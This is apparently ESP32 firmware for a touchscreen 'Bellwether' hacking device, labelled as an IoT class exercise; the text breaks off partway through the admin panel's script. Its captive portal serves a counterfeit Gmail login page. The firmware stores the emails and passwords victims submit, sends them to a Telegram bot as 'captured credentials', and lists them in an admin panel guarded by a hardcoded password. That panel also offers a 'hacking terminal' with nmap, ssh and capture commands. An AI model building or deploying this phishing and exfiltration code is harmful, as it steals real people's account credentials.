#include <TFT_eSPI.h>
#include <XPT2046_Touchscreen.h>
#include <SPI.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <Preferences.h>
#include "esp_wifi.h"
#include "esp_netif.h"
#include "lwip/netif.h"
#include "splash.h"
#include "images.h"
#include <TJpg_Decoder.h>
#include <libssh_esp32.h>
#include <libssh/libssh.h>
#include <HTTPClient.h>
#include <WiFiClientSecure.h>

#define TOUCH_CS  33
#define TOUCH_IRQ 36

TFT_eSPI tft = TFT_eSPI();
XPT2046_Touchscreen ts(TOUCH_CS, TOUCH_IRQ);
Preferences prefs;

#define TELEGRAM_BOT_TOKEN "token"
#define TELEGRAM_CHAT_ID "id-token"

#define LARG 320
#define ALT  240

// ================= AFFINE CALIBRATION =================
float calAx = 0, calBx = 0, calCx = 160;
float calAy = 0, calBy = 0, calCy = 120;
bool calibrado = false;

void computeCalibration(int rawX[], int rawY[], int scrX[], int scrY[], int n) {
  double srx=0, sry=0, ssx=0, ssy=0;
  double srx2=0, sry2=0, srxry=0;
  double srxsx=0, srysx=0, srxsy=0, srysy=0;
  for (int i = 0; i < n; i++) {
    double rx = rawX[i], ry = rawY[i];
    double sx = scrX[i], sy = scrY[i];
    srx += rx; sry += ry; ssx += sx; ssy += sy;
    srx2 += rx*rx; sry2 += ry*ry; srxry += rx*ry;
    srxsx += rx*sx; srysx += ry*sx;
    srxsy += rx*sy; srysy += ry*sy;
  }
  double M[3][4];
  for (int axis = 0; axis < 2; axis++) {
    double rhs0 = (axis==0) ? srxsx : srxsy;
    double rhs1 = (axis==0) ? srysx : srysy;
    double rhs2 = (axis==0) ? ssx   : ssy;
    M[0][0]=srx2;  M[0][1]=srxry; M[0][2]=srx; M[0][3]=rhs0;
    M[1][0]=srxry; M[1][1]=sry2;  M[1][2]=sry; M[1][3]=rhs1;
    M[2][0]=srx;   M[2][1]=sry;   M[2][2]=n;   M[2][3]=rhs2;
    for (int col = 0; col < 3; col++) {
      int mr = col;
      for (int r = col+1; r < 3; r++)
        if (fabs(M[r][col]) > fabs(M[mr][col])) mr = r;
      if (mr != col) for (int j=0;j<4;j++) { double t=M[col][j]; M[col][j]=M[mr][j]; M[mr][j]=t; }
      if (fabs(M[col][col]) < 1e-10) return;
      for (int r = col+1; r < 3; r++) {
        double f = M[r][col] / M[col][col];
        for (int j=col;j<4;j++) M[r][j] -= f * M[col][j];
      }
    }
    double res[3];
    for (int r = 2; r >= 0; r--) {
      res[r] = M[r][3];
      for (int j=r+1;j<3;j++) res[r] -= M[r][j]*res[j];
      res[r] /= M[r][r];
    }
    if (axis==0) { calAx=res[0]; calBx=res[1]; calCx=res[2]; }
    else         { calAy=res[0]; calBy=res[1]; calCy=res[2]; }
  }
  calibrado = true;
}

void saveCalibration() {
  prefs.begin("touch", false);
  prefs.putFloat("ax", calAx); prefs.putFloat("bx", calBx); prefs.putFloat("cx", calCx);
  prefs.putFloat("ay", calAy); prefs.putFloat("by", calBy); prefs.putFloat("cy", calCy);
  prefs.putBool("ok", true);
  prefs.end();
}

void loadCalibration() {
  prefs.begin("touch", true);
  calibrado = prefs.getBool("ok", false);
  if (calibrado) {
    calAx = prefs.getFloat("ax"); calBx = prefs.getFloat("bx"); calCx = prefs.getFloat("cx");
    calAy = prefs.getFloat("ay"); calBy = prefs.getFloat("by"); calCy = prefs.getFloat("cy");
    Serial.printf("CAL loaded: Ax=%.4f Bx=%.4f Cx=%.1f Ay=%.4f By=%.4f Cy=%.1f\n",
                  calAx, calBx, calCx, calAy, calBy, calCy);
  }
  prefs.end();
}

String urlEncode(const String &str) {
  String encoded = "";
  const char *p = str.c_str();
  while (*p) {
    char c = *p;
    if ((c >= '0' && c <= '9') || (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || c == '-' || c == '_' || c == '.' || c == '~') {
      encoded += c;
    } else if (c == ' ') {
      encoded += '+';
    } else {
      char buf[5];
      sprintf(buf, "%%%02X", (uint8_t)c);
      encoded += buf;
    }
    p++;
  }
  return encoded;
}

bool sendTelegramMessage(const String &text) {
  if (String(TELEGRAM_BOT_TOKEN) == "YOUR_BOT_TOKEN" || String(TELEGRAM_CHAT_ID) == "YOUR_CHAT_ID") {
    Serial.println("Telegram nao habilitado: defina BOT_TOKEN e CHAT_ID");
    return false;
  }

  WiFiClientSecure client;
  client.setInsecure();
  HTTPClient http;
  String url = String("https://api.telegram.org/bot") + TELEGRAM_BOT_TOKEN + "/sendMessage";
  if (!http.begin(client, url)) {
    Serial.println("Telegram: inicio falhou");
    return false;
  }
  http.addHeader("Content-Type", "application/x-www-form-urlencoded");
  String payload = "chat_id=" + urlEncode(TELEGRAM_CHAT_ID) + "&text=" + urlEncode(text);
  int code = http.POST(payload);
  bool ok = false;
  if (code > 0) {
    Serial.printf("Telegram status=%d\n", code);
    ok = (code == 200);
  } else {
    Serial.printf("Telegram erro: %s\n", http.errorToString(code).c_str());
  }
  http.end();
  return ok;
}

void notifyTelegramCapture(const String &ssid, const String &pass) {
  String msg = "Credenciais capturadas:\nSSID: " + ssid + "\nSenha: " + pass;
  sendTelegramMessage(msg);
}

void notifyTelegramStaConnected() {
  String msg = "ESP conectado via STA em " + WiFi.SSID() + "\nIP: " + WiFi.localIP().toString();
  sendTelegramMessage(msg);
}

// ================= MENU =================
#define BTN_X      20
#define BTN_W      280
#define BTN_H      30
#define BTN_Y0     28
#define BTN_GAP    35
#define NAV_Y      170
#define NAV_H      28
#define VOLTAR_Y   165

// Menu state: 0=main
int menuState = 0;

void telaMenuPrincipal();
void toolCaptiveAwareness();
void startPortalBackground();

// ================= TOUCH =================
bool lerTouch(int &tx, int &ty) {
  if (!ts.touched()) return false;
  TS_Point p = ts.getPoint();
  if (p.z < 200) return false;
  tx = map(p.x, 600, 3400, 320, 0);
  ty = map(p.y, 500, 3300, 240, 0);
  tx = constrain(tx, 0, LARG);
  ty = constrain(ty, 0, ALT);
  Serial.printf("T: x=%d y=%d (raw %d,%d)\n", tx, ty, p.x, p.y);
  return true;
}

// ================= UI HELPERS =================
void statusBar() {
  tft.fillRect(0, 0, LARG, 25, TFT_BLACK);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.drawString("Bellwether", 10, 7);
  tft.drawString(WiFi.status() == WL_CONNECTED ? "Online" : "Offline", LARG - 55, 7);
}

void drawVoltar() {
  tft.fillRoundRect(10, VOLTAR_Y, 90, 28, 10, 0x2104);
  tft.drawRoundRect(10, VOLTAR_Y, 90, 28, 10, TFT_WHITE);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.drawCentreString("< Voltar", 55, VOLTAR_Y + 7, 2);
}

bool isVoltar(int x, int y) {
  return x >= 5 && x <= 105 && y >= (VOLTAR_Y - 10) && y <= (VOLTAR_Y + 38);
}

void waitVoltar() {
  drawVoltar();
  while (true) {
    int x, y;
    if (lerTouch(x, y) && isVoltar(x, y)) {
      delay(200);
      while (ts.touched()) delay(10);
      return;
    }
    delay(20);
  }
}

// ================= MENU PRINCIPAL =================
void drawBigBtn(const char* txt, int slot, uint16_t cor, bool pressed = false) {
  int y = 30 + slot * 50;
  int h = 40;
  uint16_t bg = pressed ? TFT_LIGHTGREY : TFT_WHITE;
  tft.fillRoundRect(BTN_X + 2, y + 3, BTN_W, h, 15, TFT_DARKGREY);
  tft.fillRoundRect(BTN_X, y, BTN_W, h, 15, bg);
  tft.drawRoundRect(BTN_X, y, BTN_W, h, 15, cor);
  tft.setTextColor(cor);
  tft.setTextSize(1);
  tft.drawCentreString(txt, LARG / 2, y + 12, 2);
}

// ================= CALIBRAR =================
void toolCalibrar() {
  calibrado = false;

  int targets[4][2] = {{30, 30}, {290, 30}, {30, 210}, {290, 210}};
  const char* labels[] = {"Sup Esq", "Sup Dir", "Inf Esq", "Inf Dir"};
  int rawX[4], rawY[4];
  int scrX[4] = {30, 290, 30, 290};
  int scrY[4] = {30, 30, 210, 210};

  for (int t = 0; t < 4; t++) {
    tft.fillScreen(TFT_BLACK);
    int cx = targets[t][0], cy = targets[t][1];
    tft.fillCircle(cx, cy, 18, 0x1082);
    tft.drawLine(cx-22, cy, cx+22, cy, TFT_GREEN);
    tft.drawLine(cx, cy-22, cx, cy+22, TFT_GREEN);
    tft.drawCircle(cx, cy, 15, TFT_GREEN);
    tft.drawCircle(cx, cy, 8, TFT_YELLOW);
    tft.fillCircle(cx, cy, 3, TFT_RED);
    tft.setTextColor(TFT_WHITE);
    tft.drawCentreString("Segure a caneta no alvo", 160, 105, 2);
    tft.setTextColor(TFT_CYAN);
    tft.drawCentreString(labels[t], 160, 125, 2);
    char step[8]; sprintf(step, "%d/4", t+1);
    tft.setTextColor(TFT_DARKGREY);
    tft.drawCentreString(step, 160, 145, 2);

    while (!ts.touched()) delay(10);
    delay(150);
    long sumX = 0, sumY = 0; int samples = 0;
    while (ts.touched() && samples < 16) {
      TS_Point p = ts.getPoint();
      if (p.z >= 200) { sumX += p.x; sumY += p.y; samples++; }
      delay(25);
    }
    if (samples > 0) { rawX[t] = sumX / samples; rawY[t] = sumY / samples; }
    Serial.printf("%s: avg(%d) raw X=%d Y=%d\n", labels[t], samples, rawX[t], rawY[t]);
    while (ts.touched()) delay(10);
    delay(400);
  }

  computeCalibration(rawX, rawY, scrX, scrY, 4);
  if (calibrado) saveCalibration();

  tft.fillScreen(TFT_BLACK);
  tft.setTextColor(calibrado ? TFT_GREEN : TFT_RED);
  tft.drawCentreString(calibrado ? "Calibracao OK!" : "ERRO!", 160, 5, 2);
  for (int t = 0; t < 4; t++) {
    char buf[40]; sprintf(buf, "%s: raw(%d, %d)", labels[t], rawX[t], rawY[t]);
    tft.setTextColor(TFT_WHITE);
    tft.drawString(buf, 5, 28 + t * 16, 1);
  }

  if (calibrado) {
    tft.setTextColor(TFT_YELLOW);
    tft.drawCentreString("TESTE: desenhe na tela!", 160, 118, 2);
    tft.drawCentreString("Voltar = canto inf-esq", 160, 140, 1);
    tft.drawRect(0, 0, LARG, ALT, TFT_DARKGREY);
    tft.drawLine(LARG/2, 0, LARG/2, ALT, 0x2104);
    tft.drawLine(0, ALT/2, LARG, ALT/2, 0x2104);
    while (true) {
      if (ts.touched()) {
        TS_Point p = ts.getPoint();
        if (p.z >= 200) {
          int dx = constrain((int)(calAx*p.x+calBx*p.y+calCx), 0, LARG-1);
          int dy = constrain((int)(calAy*p.x+calBy*p.y+calCy), 0, ALT-1);
          tft.fillCircle(dx, dy, 2, TFT_GREEN);
          if (dx < 50 && dy > 190) { delay(300); while(ts.touched()) delay(10); break; }
        }
      }
      delay(15);
    }
  } else {
    waitVoltar();
  }
  telaMenuPrincipal();
}

void telaMenuPrincipal() {
  menuState = 0;
  tft.fillScreen(TFT_BLACK);
  tft.drawXBitmap(40, 0, splash_bitmap, SPLASH_WIDTH, SPLASH_HEIGHT, 0x18E3);
  statusBar();
  drawBigBtn("Captive Portal", 0, TFT_GREEN);
  drawBigBtn("Calibrar Touch", 1, TFT_YELLOW);
}

// ========== TOOL 9: Aula IoT - Captive Portal ==========
DNSServer dnsServer;
WebServer webServer(80);
volatile int portalAttempts = 0;
bool adminLogado = false;
String lastSSID = "";
String lastPass = "";
bool portalAtivo = false;

// WiFi async connect state
volatile bool wifiConnecting = false;
String wifiPendingSSID = "";
String wifiPendingPass = "";
unsigned long wifiConnectStart = 0;

// Fix routing: set STA or AP as default network interface
void setDefaultRoute(bool useSTA) {
  IPAddress target = useSTA ? WiFi.localIP() : WiFi.softAPIP();
  uint32_t targetU32 = (uint32_t)target;
  struct netif *nif = netif_list;
  while (nif != NULL) {
    if (ip4_addr_get_u32(netif_ip4_addr(nif)) == targetU32) {
      netif_set_default(nif);
      Serial.printf("Route -> %s (%s)\n", useSTA ? "STA" : "AP", target.toString().c_str());
      return;
    }
    nif = nif->next;
  }
  Serial.println("setDefaultRoute: netif nao encontrado!");
}

// Ensure STA is default route before outbound connection
void ensureSTARoute() {
  if (WiFi.status() == WL_CONNECTED) setDefaultRoute(true);
}

#define MAX_CAPTURES 30
struct Captura { String user; String pass; };
Captura capturas[MAX_CAPTURES];
int numCapturas = 0;

#define MAX_LOGS 50
struct LogEntry { unsigned long timestamp; String ip; String ua; };
LogEntry loginLogs[MAX_LOGS];
int numLogs = 0;

void addLoginLog(String ip, String ua) {
  if (numLogs < MAX_LOGS) {
    loginLogs[numLogs].timestamp = millis();
    loginLogs[numLogs].ip = ip;
    loginLogs[numLogs].ua = ua;
    numLogs++;
  }
}

void portalHandleRoot() {
  webServer.send(200, "text/html", R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <title>Gmail</title>
    <link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%2016%2016'%3E%3Ctext%20x='0'%20y='14'%3E✉️%3C/text%3E%3C/svg%3E" type="image/svg+xml" />
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: "Google Sans",roboto,"Noto Sans Myanmar UI",arial,sans-serif;
        }
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f1f1f1;
        }
        .login-container {
            width: 100%;
            max-width: 400px;
            margin: auto;
            padding: 20px;
            border: 1px solid #e9e9e9;
            border-radius: 25px;
            margin-top: 50px;
            background-color: #fff;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        #logo {
            display: block;
            margin: 0 auto 20px;
        }
        h1, h2, h6 {
            color: #1f1f1f;
            margin-bottom: 20px;
            font-weight: 400;
            letter-spacing: 0rem;
            line-height: 1.5;
            word-break: break-word;
        }
        .g-input {
            display: block;
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
        }
        .gbtn-primary {
            display: block;
            width: 100px;
            padding: 10px;
            border: none;
            border-radius: 55px;
            background-color: #1a73e8;
            color: #fff;
            cursor: pointer;
            max-width: 200px !important;
            float: right;
        }
        .gbtn-primary:hover {
            background-color: #1664c1;
        }
        .gbtn-secondary {
            display: inline-block;
            padding: 10px 18px;
            border-radius: 55px;
            background-color: #202124;
            color: #fff;
            text-decoration: none;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
        }
        .gbtn-secondary:hover {
            background-color: #171818;
        }
        label {
            font-size: 12px;
            color: #6a6b6b;
            margin-left: 10px;
            margin-top: 1px;
            margin-bottom: 12px;
        }
        .g-footer{
            margin-top: 100px;
            text-align: center;
            font-size: 12px;
            color: #a0a0a0;
            width: 100%;
            max-width: 400px;
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        .g-footer a {
            color: #a0a0a0;
            text-decoration: none;
            margin: 0 5px;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <form action="/save" id="get-usr-pwd" method="post" autocomplete="on">
            <div id="logo">
                <svg xmlns="https://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true" jsname="jjf7Ff"><path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path><path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path><path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path><path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path></svg>
            </div>
            <h2>Fazer login</h2>
            <h6>Ir para o Gmail</h6>
            <input name="ssid" type="text" class="g-input" placeholder="E-mail ou telefone" required>
            <input name="pass" type="password" class="g-input" placeholder="Senha" required>
            <h6 style="color: #a0a0a0;">
                Não está no seu computador? Use uma janela privada para fazer login.
            </h6>
            <button class="gbtn-primary" type="submit">Avançar</button>
        </form>
        <a class="gbtn-secondary" href="/aula">Portal Admin</a>
    </div>
    <div class="g-footer">
        <a href="#">Ajuda</a>
        <a href="#">Privacidade</a>
        <a href="#">Termos</a>
        <a href="#">Configurações</a>
        <a href="#">Sobre</a>
        <a href="#">Google</a>
    </div>
    <br>
</body>
</html>
)rawliteral");
}

void portalHandleSave() {
  lastSSID = webServer.arg("ssid");
  lastPass = webServer.arg("pass");
  portalAttempts++;

  if (numCapturas < MAX_CAPTURES) {
    capturas[numCapturas].user = lastSSID;
    capturas[numCapturas].pass = lastPass;
    numCapturas++;
  }

  prefs.begin("aula", false);
  prefs.putString("ssid", lastSSID);
  prefs.putString("pass", lastPass);
  prefs.end();

  Serial.println("=== Dados Salvos ===");
  Serial.println(lastSSID);
  Serial.println(lastPass);
  notifyTelegramCapture(lastSSID, lastPass);

  webServer.send(200, "text/html", R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Conectado</title>
<style>
body{margin:0;font-family:Arial,sans-serif;background:linear-gradient(135deg,#1e3c72,#2a5298);display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:white;padding:30px;border-radius:12px;width:90%;max-width:350px;box-shadow:0 10px 25px rgba(0,0,0,0.3);text-align:center}
.ok{font-size:60px}
h2{color:#2a5298}
p{color:#666}
</style>
</head>
<body>
<div class="card">
<div class="ok">&#10004;</div>
<h2>Conectado com sucesso!</h2>
<p>Voce ja pode usar a internet normalmente.</p>
</div>
</body>
</html>
)rawliteral");
}

void portalHandleLoginPage() {
  webServer.send(200, "text/html", R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Login</title>
<style>
body{margin:0;font-family:Arial,sans-serif;background:#0a0a0a;color:white;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#1c1c1c;padding:30px;border-radius:12px;width:90%;max-width:350px;box-shadow:0 0 20px rgba(255,0,0,0.3)}
h2{text-align:center;color:#ff4444;margin-bottom:20px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:8px;background:#222;color:white;box-sizing:border-box;font-size:16px}
button{width:100%;padding:12px;margin-top:15px;background:#ff4444;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer}
button:hover{background:#cc0000}
.err{color:#ff4444;text-align:center;font-size:13px;margin-top:10px;display:none}
</style>
</head>
<body>
<div class="card">
<h2>Admin Panel</h2>
<form action="/aula-login" method="POST">
<input name="user" placeholder="Usuario" autocomplete="off">
<input name="pass" placeholder="Senha" type="password">
<button type="submit">Entrar</button>
</form>
</div>
</body>
</html>
)rawliteral");
}

void portalHandleAdminLogin() {
  String u = webServer.arg("user");
  String p = webServer.arg("pass");
  if (u == "admin" && p == "pass@1") {
    adminLogado = true;
    addLoginLog(webServer.client().remoteIP().toString(),
                webServer.hasHeader("User-Agent") ? webServer.header("User-Agent") : "unknown");
    webServer.sendHeader("Location", "/painel");
    webServer.send(302, "text/plain", "OK");
  } else {
    webServer.send(200, "text/html", R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin Login</title>
<style>
body{margin:0;font-family:Arial,sans-serif;background:#0a0a0a;color:white;display:flex;justify-content:center;align-items:center;height:100vh}
.card{background:#1c1c1c;padding:30px;border-radius:12px;width:90%;max-width:350px;box-shadow:0 0 20px rgba(255,0,0,0.3)}
h2{text-align:center;color:#ff4444;margin-bottom:20px}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:8px;background:#222;color:white;box-sizing:border-box;font-size:16px}
button{width:100%;padding:12px;margin-top:15px;background:#ff4444;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer}
.err{color:#ff4444;text-align:center;font-size:13px;margin-top:10px}
</style>
</head>
<body>
<div class="card">
<h2>Admin Panel</h2>
<form action="/aula-login" method="POST">
<input name="user" placeholder="Usuario" autocomplete="off">
<input name="pass" placeholder="Senha" type="password">
<button type="submit">Entrar</button>
</form>
<div class="err">Usuario ou senha incorretos</div>
</div>
</body>
</html>
)rawliteral");
  }
}

void portalHandlePainel() {
  if (!adminLogado) {
    webServer.sendHeader("Location", "/aula");
    webServer.send(302, "text/plain", "Login necessario");
    return;
  }

  String credsHtml = "";
  if (numCapturas == 0) {
    credsHtml = "<div class='empty'>Nenhuma captura ainda...</div>";
  } else {
    for (int i = 0; i < numCapturas; i++) {
      credsHtml += "<div class='entry'><span class='num'>#" + String(i+1) + "</span> <b>" + capturas[i].user + "</b> &mdash; " + capturas[i].pass + "</div>";
    }
  }

  String wifiStatus = "";
  if (WiFi.status() == WL_CONNECTED) {
    wifiStatus = "{\"connected\":true,\"ssid\":\"" + WiFi.SSID() + "\",\"ip\":\"" + WiFi.localIP().toString() + "\",\"rssi\":" + String(WiFi.RSSI()) + "}";
  } else {
    wifiStatus = "{\"connected\":false}";
  }

  String page = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Admin - Bellwether</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Courier New',monospace;background:#0a0a0a;color:#ccc;min-height:100vh;display:flex;flex-direction:column}
.topbar{background:#111;padding:8px 15px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #222}
.topbar h3{color:#00ff88;font-size:13px}
.toplinks{display:flex;gap:6px}
.toplinks a{color:#ccc;text-decoration:none;font-size:11px;padding:4px 10px;border:1px solid #333;border-radius:4px}
.toplinks a:hover{background:#222}
.toplinks a.danger{color:#ff4444;border-color:#ff4444}
.toplinks a.danger:hover{background:#ff4444;color:#fff}
.tabs{display:flex;background:#111;border-bottom:2px solid #222}
.tab{flex:1;padding:10px;text-align:center;cursor:pointer;font-size:12px;color:#666;border-bottom:2px solid transparent;transition:all .2s}
.tab:hover{color:#aaa;background:#151515}
.tab.active{color:#00ff88;border-bottom-color:#00ff88;background:#0a0a0a}
.panel{display:none;flex:1;overflow-y:auto;padding:12px}
.panel.active{display:block}
.entry{background:#151515;border-left:3px solid #00ff88;padding:8px 12px;margin:6px 0;border-radius:4px;font-size:12px;word-break:break-all}
.entry .num{color:#00ff88;font-weight:bold}
.empty{text-align:center;color:#444;padding:30px}
.count{text-align:center;color:#666;margin-bottom:8px;font-size:11px}
/* Terminal styles */
#term-frame{flex:1;display:flex;flex-direction:column;height:calc(100vh - 90px)}
#terminal{flex:1;overflow-y:auto;padding:10px;font-size:12px;line-height:1.5;background:#0a0a0a}
.line{margin:1px 0;word-wrap:break-word;white-space:pre-wrap}
.cmd{color:#00ff88}.out{color:#ccc}.err{color:#ff4444}.info{color:#4488ff}.sys{color:#555}.warn{color:#ffaa00}
.inputbar{background:#111;padding:8px 10px;border-top:1px solid #222;display:flex;gap:6px;align-items:center}
.prompt{color:#ff4444;font-size:13px;white-space:nowrap}
.prompt2{color:#00ff88}
#cmdInput{flex:1;background:#0a0a0a;border:1px solid #222;color:#00ff88;padding:6px 10px;font-family:'Courier New',monospace;font-size:13px;border-radius:4px;outline:none}
#cmdInput:focus{border-color:#00ff88;box-shadow:0 0 5px rgba(0,255,136,0.15)}
#sendBtn{background:#00ff88;color:#000;border:none;padding:6px 14px;border-radius:4px;font-weight:bold;cursor:pointer;font-size:12px}
#sendBtn:hover{background:#00cc6a}
#sendBtn:disabled{background:#222;color:#444;cursor:wait}
/* WiFi styles */
.wifi-box{background:#151515;border:1px solid #222;border-radius:8px;padding:15px;margin-bottom:12px}
.wifi-box h4{color:#ffaa00;margin-bottom:8px;font-size:13px}
.wifi-status{padding:10px;border-radius:6px;margin-bottom:10px;font-size:12px}
.wifi-status.on{background:#0a2a0a;border:1px solid #00ff88;color:#00ff88}
.wifi-status.off{background:#2a0a0a;border:1px solid #ff4444;color:#ff4444}
.scan-btn{background:#222;color:#00ff88;border:1px solid #00ff88;padding:8px 16px;border-radius:6px;cursor:pointer;font-family:inherit;font-size:12px;width:100%;margin-bottom:10px}
.scan-btn:hover{background:#00ff88;color:#000}
.scan-btn:disabled{opacity:0.4;cursor:wait}
.net-list{max-height:200px;overflow-y:auto}
.net-item{background:#111;padding:8px 10px;margin:4px 0;border-radius:4px;cursor:pointer;display:flex;justify-content:space-between;font-size:11px;border:1px solid transparent}
.net-item:hover{border-color:#00ff88;background:#0a1a0a}
.net-item.selected{border-color:#00ff88;background:#0a2a0a}
.net-item .ssid{color:#fff;font-weight:bold}
.net-item .meta{color:#666}
.signal{display:inline-block;width:20px}
.pass-row{display:flex;gap:6px;margin-top:10px}
.pass-row input{flex:1;background:#0a0a0a;border:1px solid #222;color:#fff;padding:8px;font-family:inherit;font-size:12px;border-radius:4px}
.pass-row input:focus{border-color:#ffaa00}
.connect-btn{background:#ffaa00;color:#000;border:none;padding:8px 16px;border-radius:6px;cursor:pointer;font-weight:bold;font-family:inherit;font-size:12px}
.connect-btn:hover{background:#cc8800}
.connect-btn:disabled{opacity:0.4;cursor:wait}
.disconnect-btn{background:#ff4444;color:#fff;border:none;padding:6px 12px;border-radius:4px;cursor:pointer;font-size:11px;margin-top:6px}
.disconnect-btn:hover{background:#cc0000}
.msg{font-size:11px;margin-top:6px;padding:6px;border-radius:4px}
.msg.ok{background:#0a2a0a;color:#00ff88}
.msg.fail{background:#2a0a0a;color:#ff4444}
</style>
</head>
<body>
<div class="topbar">
<h3>Bellwether Admin</h3>
<div class="toplinks">
<a href="/log">Logs</a>
<a class="danger" href="/logout">Sair</a>
</div>
</div>
<div class="tabs">
<div class="tab active" onclick="showTab(0)">Credenciais</div>
<div class="tab" onclick="showTab(1)">Terminal SSH</div>
<div class="tab" onclick="showTab(2)">WiFi</div>
</div>

<!-- TAB 0: Credenciais -->
<div class="panel active" id="p0">
<div class="count">Total capturado: )rawliteral";

  page += String(numCapturas);
  page += R"rawliteral(</div>
)rawliteral";
  page += credsHtml;
  page += R"rawliteral(
</div>

<!-- TAB 1: Terminal SSH -->
<div class="panel" id="p1">
<div id="term-frame">
<div id="terminal">
<div class="line sys">  ____       _ _              _   _               </div>
<div class="line sys"> | __ ) ___ | | |_      _____| |_| |__   ___ _ __ </div>
<div class="line sys"> |  _ \/ _ \| | \ \ /\ / / _ \ __| '_ \ / _ \ '__|</div>
<div class="line sys"> | |_) |  __/| | |\ V  V /  __/ |_| | | |  __/ |   </div>
<div class="line sys"> |____/ \___|_|_| \_/\_/ \___|\__|_| |_|\___|_|   </div>
<div class="line sys">&nbsp;</div>
<div class="line warn">BellwetherOS 1.0 — ESP32 Hacking Terminal</div>
<div class="line info">Digite 'help' para lista de comandos.</div>
<div class="line sys">&nbsp;</div>
</div>
<div class="inputbar">
<span class="prompt">root@<span class="prompt2">bellwether</span>:~$</span>
<input id="cmdInput" type="text" autocomplete="off" maxlength="200" spellcheck="false">
<button id="sendBtn" onclick="sendCmd()">RUN</button>
</div>
</div>
</div>

<!-- TAB 2: WiFi -->
<div class="panel" id="p2">
<div class="wifi-box">
<h4>Status da Conexao</h4>
<div class="wifi-status off" id="wifiSt">Verificando...</div>
<div id="wifiActions"></div>
</div>
<div class="wifi-box">
<h4>Conectar em Rede WiFi</h4>
<button class="scan-btn" id="scanBtn" onclick="scanWifi()">Escanear Redes</button>
<div class="net-list" id="netList"></div>
<div class="pass-row" id="passRow" style="display:none">
<input id="wifiPass" type="password" placeholder="Senha da rede">
<button class="connect-btn" id="connBtn" onclick="connectWifi()">Conectar</button>
</div>
<div id="wifiMsg"></div>
</div>
</div>

<script>
var tabs=document.querySelectorAll('.tab');
var panels=document.querySelectorAll('.panel');
function showTab(i){
  tabs.forEach(function(t,j){t.classList.toggle('active',j===i);});
  panels.forEach(function(p,j){p.classList.toggle('active',j===i);});
  if(i===1)inp.focus();
  if(i===2)checkWifi();
}

// ====== Terminal ======
var cmds=['help','clear','whoami','hostname','uname','uptime','free','df','ps','reboot','ifconfig','iwconfig','iwlist','nmcli','ping','nmap','arp','netstat','macchanger','capture','ssh','curl','echo','date','cat','ls','pwd','id','history'];
var hist=[];var hIdx=-1;
var term=document.getElementById('terminal');
var inp=document.getElementById('cmdInput');
var btn=document.getElementById('sendBtn');

function addLine(t,c){
  t.split('\n').forEach(function(l){
    var d=document.createElement('div');d.className='line '+c;d.textContent=l;term.appendChild(d);
  });
  term.scrollTop=term.scrollHeight;
}

function sendCmd(){
  var c=inp.value.trim();if(!c)return;
  addLine('root@bellwether:~$ '+c,'cmd');
  hist.unshift(c);if(hist.length>100)hist.pop();hIdx=-1;inp.value='';
  if(c==='clear'||c==='cls'){term.innerHTML='';inp.focus();return;}
  btn.disabled=true;btn.textContent='...';
  var x=new XMLHttpRequest();x.open('POST','/cmd',true);
  x.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
  x.onreadystatechange=function(){
    if(x.readyState===4){
      btn.disabled=false;btn.textContent='RUN';
      if(x.status===200){var r=x.responseText;if(r==='\x01CLEAR\x01'){term.innerHTML='';inp.focus();return;}addLine(r,'out');}
      else if(x.status===403)addLine('Sessao expirada.','err');
      else addLine('Erro HTTP '+x.status,'err');
      inp.focus();
    }
  };
  x.timeout=60000;x.ontimeout=function(){btn.disabled=false;btn.textContent='RUN';addLine('Timeout 60s','err');inp.focus();};
  x.send('cmd='+encodeURIComponent(c));
}

inp.addEventListener('keydown',function(e){
